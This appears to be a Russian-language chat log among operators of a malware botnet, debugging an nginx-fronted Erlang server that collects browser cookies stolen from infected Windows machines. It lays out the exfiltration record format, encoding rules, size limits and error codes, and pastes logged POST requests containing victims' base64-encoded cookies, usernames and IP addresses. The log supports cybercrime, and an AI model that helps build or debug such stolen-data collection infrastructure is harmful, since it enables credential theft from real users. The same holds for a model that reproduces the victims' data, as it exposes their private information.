Timestamp	From	To	Message
2021-08-30 09:28:46.213405	zulas	ttrr	краши по факту могут быть всегда -- всмысли когда какой-то левый протокол на порт коннектится .. то может быть краш в лог . это не значит что сервис в дауне . это просто значит что один именно этот запрос не вызвал нужной реакции сервера
2021-08-30 09:28:46.215897	ttrr	zulas	краши по факту могут быть всегда -- всмысли когда какой-то левый протокол на порт коннектится .. то может быть краш в лог . это не значит что сервис в дауне . это просто значит что один именно этот запрос не вызвал нужной реакции сервера
2021-08-30 09:36:07.621543	zulas	ttrr	> соотвественно давайте хттп2 просто закроем и всё 
точнее закроем все что не хттп1
2021-08-30 09:36:07.623887	ttrr	zulas	> соотвественно давайте хттп2 просто закроем и всё 
точнее закроем все что не хттп1
2021-08-30 09:36:26.643394	zulas	ttrr	я не думаю что у Nginx проблемы могут быть с такой логикой .. правильно ?
2021-08-30 09:36:26.646624	ttrr	zulas	я не думаю что у Nginx проблемы могут быть с такой логикой .. правильно ?
2021-08-30 09:43:57.354297	ttrr	zulas	всем привет
2021-08-30 09:44:05.523077	ttrr	zulas	вот для этого я и делал нджинк
2021-08-30 09:44:20.138992	ttrr	zulas	но он как драйвер сказал не правильно проксировал
2021-08-30 09:44:24.801594	ttrr	zulas	сейчас я с этим разберусь
2021-08-30 09:44:34.737185	ttrr	zulas	+ сделаю только хттп1
2021-08-30 09:44:44.414749	ttrr	zulas	+ логирование запросов и тела
2021-08-30 13:22:35.597711	ttrr	zulas	сделал логирование
2021-08-30 13:22:38.303148	ttrr	zulas	/var/log/nginx/access.log
2021-08-30 13:22:59.688335	ttrr	zulas	все выводит что проходит через нджинкс
2021-08-30 13:23:34.904066	ttrr	zulas	выпилить хттп2 не так просто, надо собирать свой дистр
2021-08-30 13:23:45.777141	ttrr	zulas	давайте начнем пока с ищучения лога
2021-08-30 13:24:22.987972	ttrr	zulas	если деро крашится значит нджинкс примет код не 200 и по нему можно увидеть какие там данные
2021-08-30 13:28:03.101213	ttrr	zulas	да и если есть там реальный срач, давайте напишите мне регулярку по которой я отсеку в нджинксе все кроме норм запросов
2021-08-30 14:30:22.899517	ttrr	zulas	все видят что я пишу?
2021-08-30 14:30:26.956269	ttrr	zulas	смотрите?
2021-08-30 14:30:38.866507	ttrr	zulas	Я вижу.
2021-08-30 14:31:11.733289	ttrr	zulas	Я пока не понял как мне сообщение посмотреть и тело запроса.
\x16\x03\x03\x00\xC2\x01\x00\x00\xBE\x03\x03a,O\xBC\xF5\xC6\xCFw\x958\xE8\x15O@\xBD)\xC5\xD3\xCA\x81\xE2\xA7i\xAF\xCCg\xA9[6k_/\x00\x00&\xC0,\xC0+\xC00\xC0/\xC0$\xC0#\xC0(\xC0'\xC0
2021-08-30 14:31:31.402304	ttrr	zulas	Вот такое есть, это бинарные данные?
2021-08-30 14:32:37.711543	ttrr	zulas	вот есть так как ты написал
2021-08-30 14:32:44.615247	ttrr	zulas	в не понятной кодировке
2021-08-30 14:32:47.117907	ttrr	zulas	а есть норм
2021-08-30 14:32:53.468678	ttrr	zulas	200.58.180.138 -  [30/Aug/2021:17:31:45 +0300] "POST /mor1/WIN-OQR8NN197GR_W639600.5B505F7FFC79B12CBB3622DF3CBB3B1C/84/ HTTP/1.1" 403 182 "" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Win64; x64
; Trident/7.0; .NET4.0E; .NET4.0C; InfoPath.3; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729)" "-----------KRLRMIKEGVGXNTPQ\r\nContent-Disposition: form-data; name=\"data\"\r\n\r\nUtente2|Ch
rome|dGFncy5hZHNhZmV0eS5uZXQ=|RElE|OTUxNTg3OGU0MjIzODM5YmQ4MjQxNzhjZTIwYTBjMDM=|1546590957|2147483641|Lw==\r\nUtente2|Chrome|dGFncy5hZHNhZmV0eS5uZXQ=|SURU|MTAw|1546590957|2147483641|Lw==\r\nUtente2|Chrom
e|dGFncy5hZHNhZmV0eS5uZXQ=|VUlE|OTUxNTg3OGU0MjIzODM5YmQ4MjQxNzhjZTIwYTBjMDM=|1546590957|2147483641|Lw==\r\nUtente2|Chrome|LmFkc2FmZXR5Lm5ldA==|Y3RfZGlk|OTUxNTg3OGU0MjIzODM5YmQ4MjQxNzhjZTIwYTBjMDM=|154659
0957|2147483641|Lw==\r\nUtente2|Chrome|LmFkc2FmZXR5Lm5ldA==|Y3RfaWR0|MTAw|1546590957|2147483641|Lw==\r\nUtente2|Chrome|LmFkc2FmZXR5Lm5ldA==|Y3RfdWlk|OTUxNTg3OGU0MjIzODM5YmQ4MjQxNzhjZTIwYTBjMDM=|154659095
7|2147483641|Lw==\r\nUtente2|Chrome|dGFncy5hZHNhZmV0eS5uZXQ=|dg==|Mg==|1546590957|2147483641|Lw==\r\nUtente2|Chrome|Lmdvb2dsZS5jb20=|Q09OU0VOVA==|WUVTK0lULml0K1YxMg==|1550218723|2146723192|Lw==\r\nUtente
2|Chrome|Lmdvb2dsZS5pdA==|Q09OU0VOVA==|WUVTK0lULml0K1YxMg==|1550218724|2146723192|Lw==\r\nUtente2|Chrome|LnlvdXR1YmUuY29t|Q09OU0VOVA==|WUVTK0lULml0K1YxMg==|1550218724|2146723192|Lw==\r\nUtente2|Chrome|Lm
ludGVudGlxLmNvbQ==|SVF2ZXI=|MS45|1562134121|1877494136|Lw==\r\nUtente2|Chrome|LmhvdGVscy5jb20=|X2Nsc192|MGE5ZTdlN2UtZGY1Mi00YWQzLWI0YjItY2UxZGI0MGQ1MWU5|1562134143|1719814143|Lw==\r\nUtente2|Chrome|LnRya
XZhZ28uY29t|Y3RpZA==|SzRETTU1bm1JMzdIQzVudXZUTXBveFhROU4=|1562134117|2147483643|Lw==\r\nUtente2|Chrome|d3d3LnRyaXZhZ28uaXQ=|ZnR2|JTdCJTIyZnR2JTIyJTNBJTIyMjAxOTA3MDMwNjA4NDAlMjIlMkMlMjJsdHYlMjIlM0ElMjIyMD
E5MDcwMzA2MDg0MCUyMiUyQyUyMmVwJTIyJTNBOTk5OSUyQyUyMmNudHYlMjIlM0ExJTJDJTIyY250YyUyMiUzQTElMkMlMjJjbnRjcyUyMiUzQTElMkMlMjJmZXAlMjIlM0E5OTk5JTJDJTIydmMlMjIlM0EwJTJDJTIyY3RsJTIyJTNBOTk5JTJDJTIyY3RmJTIyJTNBO
Tk5JTJDJTIyaXRlbSUyMiUzQTIzMTMxNjglMkMlMjJwYXRoJTIyJTNBNDU4MTclMkMlMjJwYXRoMiUyMiUzQW51bGwlN0Q=|1562134136|2147483644|Lw==\r\nUtente2|Chrome|Lnd3dy50cml2YWdvLml0|aW50ZW50X21lZGlhX3ByZWZz||1562134121|-210
1681175|Lw==\r\nUtente2|Chrome|ZHVzLnRyaXZhZ28uY29t|c0xhbmd1YWdlTG9jYWxl|VUs=|1562134117|2147483643|Lw==\r\nUtente2|Chrome|c2VjZGUudHJpdmFnby5jb20=|c0xhbmd1YWdlTG9jYWxl|VUs=|1562134120|2147483643|Lw==\r\
nUtente2|Chrome|LnRyaXZhZ28uY29t|dGlk|N2JXQjhlZzVSalZ1VUI2Rm1hOXFTMXZXSlQ=|1562134140|2147483643|Lw==\r\nUtente2|Chrome|LnRyaXZhZ28uaXQ=|dGlk|NGFBWHhYNldhaG5IWmhHRm1PVFRLNkpVYl8=|1562134117|2147483643|Lw
==\r\nUtente2|Chrome|LnRyaXZhZ28uY29t|dHJ2X3RpZA==|N2JXQjhlZzVSalZ1VUI2Rm1hOXFTMXZXSlQ=|1562134140|2147483643|Lw==\r\nUtente2|Chrome|LnRyaXZhZ28uaXQ=|dHJ2X3RpZA==|NGFBWHhYNldhaG5IWmhHRm1PVFRLNkpVYl8=|156

...
...........
2021-08-30 14:33:11.249910	ttrr	zulas	хооооотя код 403
2021-08-30 14:33:14.508084	ttrr	zulas	почему
2021-08-30 14:33:57.058236	ttrr	zulas	zulas: давай разбираться
2021-08-30 14:36:02.442993	ttrr	zulas	POST /mor1/WIN-OQR8NN197GR_W639600.5B505F7FFC79B12CBB3622DF3CBB3B1C/84/ HTTP/1.1
2021-08-30 14:36:21.827212	ttrr	zulas	это наш запрос, если не ошибаюсь это куки
2021-08-30 14:36:35.158275	ttrr	zulas	zulas: поясни почему 403
2021-08-30 14:38:38.677842	ttrr	zulas	buza: давай я тебе скину креды, может ты тоже посмотришь логи?
2021-08-30 14:38:38.681869	ttrr	zulas	В конце данные обрезаны
2021-08-30 14:38:49.486954	ttrr	zulas	просто чувствую что гл=де то рядом ответ
2021-08-30 14:38:54.992675	ttrr	zulas	Это так скопировалось?
2021-08-30 14:39:04.026017	ttrr	zulas	driver: это я обрезал, там дохрена
2021-08-30 14:39:24.311837	ttrr	zulas	Ок
2021-08-30 14:39:40.412073	ttrr	zulas	defender: в последний раз когда я этим занимался (еще будучи разработчиком того самого модуля который эти данные шлет), коды ошибки приходили от бэкенда в случае если ему данные не нравились
2021-08-30 14:40:13.908887	ttrr	zulas	т.е. тут нужно указание от зуласа, начиная с какого смещения в этом запросе данные невалидны (по мнению парсящей их библиотеки)
2021-08-30 14:41:26.284587	ttrr	zulas	так да, но пока он думает, можетт у тебя мысли будут
2021-08-30 14:42:45.464128	zulas	ttrr	403 Forbidden шлет во многих случаях .. самый общий это неверный URL .. потом всякие баны и т.п.
2021-08-30 14:42:45.467284	ttrr	zulas	403 Forbidden шлет во многих случаях .. самый общий это неверный URL .. потом всякие баны и т.п.
2021-08-30 14:43:27.704263	ttrr	zulas	у тебя есть конкретный сервер с конкретной базой и софтом + логи
2021-08-30 14:43:31.447768	ttrr	zulas	рзберись плиз
2021-08-30 14:43:35.523264	zulas	ttrr	для 84 команды конкретно тут может быть что он ожидает данные формы .. multipart но там ничего нет
2021-08-30 14:43:35.531227	ttrr	zulas	для 84 команды конкретно тут может быть что он ожидает данные формы .. multipart но там ничего нет
2021-08-30 14:43:54.453191	zulas	ttrr	я сваливаю сейчас . смогу только завтра . так что сорян
2021-08-30 14:43:54.457047	ttrr	zulas	я сваливаю сейчас . смогу только завтра . так что сорян
2021-08-30 14:44:08.988236	ttrr	zulas	кто в жабе кодер модуля?
2021-08-30 14:44:21.705803	ttrr	zulas	надо добавить его сюда
2021-08-30 14:44:40.866388	ttrr	zulas	zulas: утром?
2021-08-30 14:45:04.423257	zulas	ttrr	ога
2021-08-30 14:45:04.426251	ttrr	zulas	ога
2021-08-30 14:45:04.868902	ttrr	zulas	чтобы сюда кодера модуля подтянуть к этому времени
2021-08-30 14:46:32.015421	zulas	ttrr	еще надо в лог писать длину пост данных .. потому что у меня лимит 64 кб
2021-08-30 14:46:32.018226	ttrr	zulas	еще надо в лог писать длину пост данных .. потому что у меня лимит 64 кб
2021-08-30 14:46:43.414376	ttrr	zulas	[19:43:23] <dgh> Там надо посмотреть весь лог, суть в том что должно быть по 8 полей 
[19:43:39] <dgh> И точно такую же ошибку нам выдавало когда их было больше или меньше 
[19:43:52] <dgh> И возвращало типа что то Missmatch parametr count 
[19:43:55] <dgh> В ответе
2021-08-30 14:46:48.421802	zulas	ttrr	таймаут по чтению - 50 секунд
2021-08-30 14:46:48.427239	ttrr	zulas	таймаут по чтению - 50 секунд
2021-08-30 14:46:58.654997	ttrr	zulas	Это еще можно проверить
2021-08-30 14:48:08.518102	zulas	ttrr	да .. надо логировать ответ сервера .. там 403 может быть с пояснением
2021-08-30 14:48:08.519910	ttrr	zulas	да .. надо логировать ответ сервера .. там 403 может быть с пояснением
2021-08-30 14:48:52.499095	zulas	ttrr	[ Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path ]
такие колонки должны быть
2021-08-30 14:48:52.505332	ttrr	zulas	[ Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path ]
такие колонки должны быть
2021-08-30 14:50:31.726139	zulas	ttrr	у меня может в глазах двоится .. но я насчитал в запросе 15 колонов в пост-дата
2021-08-30 14:50:31.730610	ttrr	zulas	у меня может в глазах двоится .. но я насчитал в запросе 15 колонов в пост-дата
2021-08-30 14:50:37.207226	zulas	ttrr	колонок
2021-08-30 14:50:37.209654	ttrr	zulas	колонок
2021-08-30 14:50:57.651385	ttrr	zulas	Я по этому куску разбил по 8 везде
2021-08-30 14:51:05.434878	ttrr	zulas	Или ты полный лог глядишь
2021-08-30 14:51:06.973380	ttrr	zulas	?
2021-08-30 14:51:14.892294	zulas	ttrr	хотя нет .. 8 )
2021-08-30 14:51:14.895359	ttrr	zulas	хотя нет .. 8 )
2021-08-30 14:51:36.061146	ttrr	zulas	То что в лимит уперлось кстати вероятно.
2021-08-30 14:51:39.704495	zulas	ttrr	короче надо ответ сервера логировать . будет понятнее . .есть такая возможсность ? )
2021-08-30 14:51:39.708525	ttrr	zulas	короче надо ответ сервера логировать . будет понятнее . .есть такая возможсность ? )
2021-08-30 14:51:39.739919	ttrr	zulas	Тоже
2021-08-30 14:51:51.342355	zulas	ttrr	и размер запроса
2021-08-30 14:51:51.346090	ttrr	zulas	и размер запроса
2021-08-30 14:52:13.541674	zulas	ttrr	свалил )
2021-08-30 14:52:13.550101	ttrr	zulas	свалил )
2021-08-30 14:54:50.406214	ttrr	zulas	сейчас автор модуля должен зайти
2021-08-31 08:20:34.371242	zulas	ttrr	ну и ?
2021-08-31 08:20:34.376574	ttrr	zulas	ну и ?
2021-08-31 08:20:44.474984	zulas	ttrr	одному мне больше всез надо ?
2021-08-31 08:20:44.477623	ttrr	zulas	одному мне больше всез надо ?
2021-08-31 08:21:25.223904	ttrr	zulas	со вчера вечера что-то писали тут?
2021-08-31 08:23:54.168485	ttrr	zulas	zulas: скинь еще раз кусок того POSTа, который был отвергнут бэком
2021-08-31 08:24:17.352136	ttrr	zulas	А тут истории нет?
Писал по поводу новых полей в записи куки
2021-08-31 08:24:26.071449	ttrr	zulas	нету истории
2021-08-31 08:26:45.179841	ttrr	zulas	ну так на чем остановились?
2021-08-31 08:27:19.303261	ttrr	zulas	я остановился на этом: вот был POST, с виду нормальный, бэк на него 403 сказал. Я попросил зуласа сказать что в нем не так
2021-08-31 08:27:38.952672	zulas	ttrr	а я попросил расширить лог . чтобы логировало ответ
2021-08-31 08:27:38.957105	ttrr	zulas	а я попросил расширить лог . чтобы логировало ответ
2021-08-31 08:27:51.218982	zulas	ttrr	и размер запроса
2021-08-31 08:27:51.222500	ttrr	zulas	и размер запроса
2021-08-31 08:29:36.043010	ttrr	zulas	а ты steller ?
2021-08-31 08:31:18.949700	ttrr	zulas	Писал по поводу новых полей в записи куки
2021-08-31 08:33:03.542594	ttrr	zulas	что именно?
2021-08-31 08:33:15.476819	ttrr	zulas	403 встречалась раньше ошибка
-----------CJLVIYOINTQPMYSU
Content-Disposition: form-data; name="data"

user|Chrome|.google.com|ANID|	djEw171ep2SDF+UMAcWRRWBcsbp5H34/V0frREuTTKAE2F3BXw3fVVHhgYgcKidlSSPxtTs32WPiqcV/p021G67RLpNXgRDrMqljrJ16Ml1Ckwz2a2URAQ==|1588241125|1651313125|/
user|Chrome|.register.com|__utma|	djEwnpzEp2a3+eOKByaEj0nLtLL7HGvIusWq1obAuia9wTCz3pPEUF6A+gFpZ3LHPf2GSueVelCwgrXMR96kV8MmLcClokQ=|1588241143|1651313173|/

-----------CJLVIYOINTQPMYSU
Content-Disposition: form-data; name="source"

Chrome cookies
-----------CJLVIYOINTQPMYSU--

403
Mismatch parameters count!
2021-08-31 08:33:43.139960	ttrr	zulas	zulas: сколько полей в куки у тебя сейчас?
steller: а у тебя?
2021-08-31 08:34:59.528517	zulas	ttrr	[ Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path ]
2021-08-31 08:34:59.534713	ttrr	zulas	[ Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path ]
2021-08-31 08:35:00.847048	zulas	ttrr	вот поля
2021-08-31 08:35:00.850115	ttrr	zulas	вот поля
2021-08-31 08:35:14.266544	zulas	ttrr	разделитель |
2021-08-31 08:35:14.268238	ttrr	zulas	разделитель |
2021-08-31 08:35:28.665989	ttrr	zulas	Разработчик админки планирует добавить 2 поля secure, httponly в конец записи.
Сейчас:
Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path
2021-08-31 08:35:46.672844	zulas	ttrr	разделители строк: [ <<10>>, <<13,10>>]
2021-08-31 08:35:46.676376	ttrr	zulas	разделители строк: [ <<10>>, <<13,10>>]
2021-08-31 08:37:31.166617	ttrr	zulas	403 была, когда некоторые поля не кодировались в В64. В отстойнике они безусловно декодировались.
2021-08-31 08:38:28.753952	ttrr	zulas	А что по поводу максимального размера данных, он ограничен 64КБ будет?
2021-08-31 08:39:10.935828	zulas	ttrr	{read_length, 64000},
{read_timeout, 50000}
я могу и больше сделать
2021-08-31 08:39:10.941605	ttrr	zulas	{read_length, 64000},
{read_timeout, 50000}
я могу и больше сделать
2021-08-31 08:39:15.177317	zulas	ttrr	таковы требоания были
2021-08-31 08:39:15.179451	ttrr	zulas	таковы требоания были
2021-08-31 08:40:40.539898	zulas	ttrr	50000 это в миллисекундах
2021-08-31 08:40:40.542206	ttrr	zulas	50000 это в миллисекундах
2021-08-31 08:43:47.769511	ttrr	zulas	В модуле нет такого ограничения. Можно разбить на несколько запросов, в принципе.
А какие ошибки отстойник может отдавать? Их желательно как-то обрабатывать.
403 добавил в обработку. На модуль приходили ещё 404 и 500. 500, видимо, от прокладки.
2021-08-31 08:45:02.925187	ttrr	zulas	при успешном приеме и добавлении в базу dero всегда выдает 200 и /1/ ?
2021-08-31 08:45:20.941050	ttrr	zulas	403 ошибка формата данных?
2021-08-31 08:45:42.354045	ttrr	zulas	просо 200 бывает без /1/ ?
2021-08-31 08:45:46.771278	ttrr	zulas	просто
2021-08-31 08:46:17.065398	ttrr	zulas	zulas:
2021-08-31 08:47:07.171946	ttrr	zulas	зачем этот /1/ ?
2021-08-31 08:47:09.994736	zulas	ttrr	reply(not_found, Req) ->
 { ok, Req1 } = cowboy_req:reply(404, [], <<"Not found">>, Req),
 Req1;

reply(forbidden, Req) ->
 { ok, Req1 } = cowboy_req:reply(403, [], <<"Forbidden">>, Req),
 Req1;

reply(missing_data, Req) ->
 { ok, Req1 } = cowboy_req:reply(403, [{<<"Forbidden">>, <<"text/plain">>}], <<"Missing data field!">>, Req),
 Req1;

reply(missing_keys, Req) ->
 { ok, Req1 } = cowboy_req:reply(403, [{<<"Forbidden">>, <<"text/plain">>}], <<"Missing keys field!">>,  Req),
 Req1;

reply(missing_parameters, Req) ->
 {ok,Req1} = cowboy_req:reply(403, [{<<"Forbidden">>, <<"text/plain">>}], <<"Mismatch parameters count!">>,  Req),
 Req1;

reply(request_timeout, Req) ->
 {ok,Req1} = cowboy_req:reply(408, [{<<"Request Timeout">>, <<"text/plain">>}], <<"Request Timeout">>,  Req),
 Req1;
2021-08-31 08:47:10.009446	ttrr	zulas	reply(not_found, Req) ->
 { ok, Req1 } = cowboy_req:reply(404, [], <<"Not found">>, Req),
 Req1;

reply(forbidden, Req) ->
 { ok, Req1 } = cowboy_req:reply(403, [], <<"Forbidden">>, Req),
 Req1;

reply(missing_data, Req) ->
 { ok, Req1 } = cowboy_req:reply(403, [{<<"Forbidden">>, <<"text/plain">>}], <<"Missing data field!">>, Req),
 Req1;

reply(missing_keys, Req) ->
 { ok, Req1 } = cowboy_req:reply(403, [{<<"Forbidden">>, <<"text/plain">>}], <<"Missing keys field!">>,  Req),
 Req1;

reply(missing_parameters, Req) ->
 {ok,Req1} = cowboy_req:reply(403, [{<<"Forbidden">>, <<"text/plain">>}], <<"Mismatch parameters count!">>,  Req),
 Req1;

reply(request_timeout, Req) ->
 {ok,Req1} = cowboy_req:reply(408, [{<<"Request Timeout">>, <<"text/plain">>}], <<"Request Timeout">>,  Req),
 Req1;
2021-08-31 08:47:16.134378	zulas	ttrr	вот такие ошибки бывают
2021-08-31 08:47:16.136735	ttrr	zulas	вот такие ошибки бывают
2021-08-31 08:47:22.015829	zulas	ttrr	текст у вас отобразился ?
2021-08-31 08:47:22.018734	ttrr	zulas	текст у вас отобразился ?
2021-08-31 08:47:31.373081	zulas	ttrr	а то у меня пиджин -- и нифига
2021-08-31 08:47:31.374518	ttrr	zulas	а то у меня пиджин -- и нифига
2021-08-31 08:47:40.868090	ttrr	zulas	отразился
2021-08-31 08:48:11.907556	ttrr	zulas	200 бывает без /1/ ?
2021-08-31 08:48:50.544549	zulas	ttrr	по коду вроде не бывает
2021-08-31 08:48:50.548807	ttrr	zulas	по коду вроде не бывает
2021-08-31 08:48:57.443031	ttrr	zulas	почуму спрашиваю - нужно ли в модуле проверять получение /1/ или достаточно получить статус 200 ?
2021-08-31 08:49:06.643219	ttrr	zulas	[11:47:07] <hof> зачем этот /1/ ?
так по тз
2021-08-31 08:49:25.810350	zulas	ttrr	это типа следующая команда для клиента
2021-08-31 08:49:25.812173	ttrr	zulas	это типа следующая команда для клиента
2021-08-31 08:49:29.556687	ttrr	zulas	т.е. 200 без /1/ не бывает?
2021-08-31 08:49:55.928173	zulas	ttrr	не бывает
2021-08-31 08:49:55.930744	ttrr	zulas	не бывает
2021-08-31 08:50:06.572005	ttrr	zulas	ок, отлично
2021-08-31 08:50:53.721546	ttrr	zulas	zulas: А сейчас логирование запросов http есть, их можно проверить?
2021-08-31 08:51:29.467127	zulas	ttrr	есть
2021-08-31 08:51:29.468479	ttrr	zulas	есть
2021-08-31 08:52:48.117697	ttrr	zulas	Скинь тогда проблемные запросы.
2021-08-31 08:58:25.513594	zulas	ttrr	2021-08-31 11:52:22.415 [info] <0.6857.3> Data: <<"POST /tot57/WIN-U4U2CDE99LP_W617601.8C95D48B33FF1976677889D52ABB8859/84/ HTTP/1.0\r\nHost: 203.76.105.227\r\nX-Real-IP: 203.76.105.227\r\nX-Forwarded-For: 203.76.105.227\r\nConnection: close\r\nContent-Length: 11059\r\nAccept: */*\r\nContent-Type: multipart/form-data; boundary=---------MOBMWAMXGTKVMATK\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET4.0C; .NET4.0E; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\r\nCache-Control: no-cache\r\n\r\n-----------MOBMWAMXGTKVMATK\r\nContent-Disposition: form-data; name=\"data\"\r\n\r\nAdministrador|Chrome|Lmdvb2dsZS5jb20=|Q0dJQw==|RWhReFF6RkRTRUpFWDJWelRWZzVOakZOV0RrMk1TS0hBWFJsZUhRdmFIUnRiQ3hoY0hCc2FXTmhkR2x2Ymk5NGFIUnRiQ3Q0Yld3c1lYQndiR2xqWVhScGIyNHZlRzFzTzNFOU1DNDVMR2x0WVdkbEwyRjJhV1lzYVcxaFoyVXZkMlZpY0N4cGJXRm5aUzloY0c1bkxDb3ZLanR4UFRBdU9DeGhjSEJzYVdOaGRHbHZiaTl6YVdkdVpXUXRaWGhqYUdGdVoyVTdkajFpTXp0eFBUQXVPUQ==|1625670207|1641222207|L2NvbXBsZXRlL3NlYXJjaA==\r\nAdministrador|Chrome|Lmdvb2dsZS5jb20=|Q0dJQw==|RWhReFF6RkRTRUpFWDJWelRWZzVOakZOV0RrMk1TS0hBWFJsZUhRdmFIUnRiQ3hoY0hCc2FXTmhkR2x2Ymk5NGFIUnRiQ3Q0Yld3c1lYQndiR2xqWVhScGIyNHZlRzFzTzNFOU1DNDVMR2x0WVdkbEwyRjJhV1lzYVcxaFoyVXZkMlZpY0N4cGJXRm5aUzloY0c1bkxDb3ZLanR4UFRBdU9DeGhjSEJzYVdOaGRHbHZiaTl6YVdkdVpXUXRaWGhqYUdGdVoyVTdkajFpTXp0eFBUQXVPUQ==|1625670207|1641222207|L3NlYXJjaA==\r\nAdministrador|C...">>
 State: {state,#Port<0.108426>,ranch_tcp,[cowboy_router,cowboy_handler],false,[{listener,http},{dispatch,[{'_',[],[{['...'],[],http_handler,[{limits,32768,1024,4096,102400,8529920,8388608,1024}]}]}]}],undefined,undefined,5,1,100,4096,64,4096,100,5000,1630399947415}
 ReqEmpty 0
2021-08-31 11:52:22.416 [critical] <0.6857.3>@http_handler:handle:33 Error {badmatch,false} [{base64,decode_binary,2,[{file,"base64.erl"},{line,212}]},{http_handler,'-save84/3-fun-4-',5,[{file,"src/http_handler.erl"},{line,329}]},{lists,foreach,2,[{file,"lists.erl"},{line,1338}]},{http_handler,save84,3,[{file,"src/http_handler.erl"},{line,325}]},{http_handler,handle,2,[{file,"src/http_handler.erl"},{line,30}]},{cowboy_handler,handler_handle,4,[{file,"src/cowboy_handler.erl"},{line,111}]},{cowboy_protocol,execute,4,[{file,"src/cowboy_protocol.erl"},{line,443}]}]
2021-08-31 08:58:25.517789	ttrr	zulas	2021-08-31 11:52:22.415 [info] <0.6857.3> Data: <<"POST /tot57/WIN-U4U2CDE99LP_W617601.8C95D48B33FF1976677889D52ABB8859/84/ HTTP/1.0\r\nHost: 203.76.105.227\r\nX-Real-IP: 203.76.105.227\r\nX-Forwarded-For: 203.76.105.227\r\nConnection: close\r\nContent-Length: 11059\r\nAccept: */*\r\nContent-Type: multipart/form-data; boundary=---------MOBMWAMXGTKVMATK\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET4.0C; .NET4.0E; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\r\nCache-Control: no-cache\r\n\r\n-----------MOBMWAMXGTKVMATK\r\nContent-Disposition: form-data; name=\"data\"\r\n\r\nAdministrador|Chrome|Lmdvb2dsZS5jb20=|Q0dJQw==|RWhReFF6RkRTRUpFWDJWelRWZzVOakZOV0RrMk1TS0hBWFJsZUhRdmFIUnRiQ3hoY0hCc2FXTmhkR2x2Ymk5NGFIUnRiQ3Q0Yld3c1lYQndiR2xqWVhScGIyNHZlRzFzTzNFOU1DNDVMR2x0WVdkbEwyRjJhV1lzYVcxaFoyVXZkMlZpY0N4cGJXRm5aUzloY0c1bkxDb3ZLanR4UFRBdU9DeGhjSEJzYVdOaGRHbHZiaTl6YVdkdVpXUXRaWGhqYUdGdVoyVTdkajFpTXp0eFBUQXVPUQ==|1625670207|1641222207|L2NvbXBsZXRlL3NlYXJjaA==\r\nAdministrador|Chrome|Lmdvb2dsZS5jb20=|Q0dJQw==|RWhReFF6RkRTRUpFWDJWelRWZzVOakZOV0RrMk1TS0hBWFJsZUhRdmFIUnRiQ3hoY0hCc2FXTmhkR2x2Ymk5NGFIUnRiQ3Q0Yld3c1lYQndiR2xqWVhScGIyNHZlRzFzTzNFOU1DNDVMR2x0WVdkbEwyRjJhV1lzYVcxaFoyVXZkMlZpY0N4cGJXRm5aUzloY0c1bkxDb3ZLanR4UFRBdU9DeGhjSEJzYVdOaGRHbHZiaTl6YVdkdVpXUXRaWGhqYUdGdVoyVTdkajFpTXp0eFBUQXVPUQ==|1625670207|1641222207|L3NlYXJjaA==\r\nAdministrador|C...">>
 State: {state,#Port<0.108426>,ranch_tcp,[cowboy_router,cowboy_handler],false,[{listener,http},{dispatch,[{'_',[],[{['...'],[],http_handler,[{limits,32768,1024,4096,102400,8529920,8388608,1024}]}]}]}],undefined,undefined,5,1,100,4096,64,4096,100,5000,1630399947415}
 ReqEmpty 0
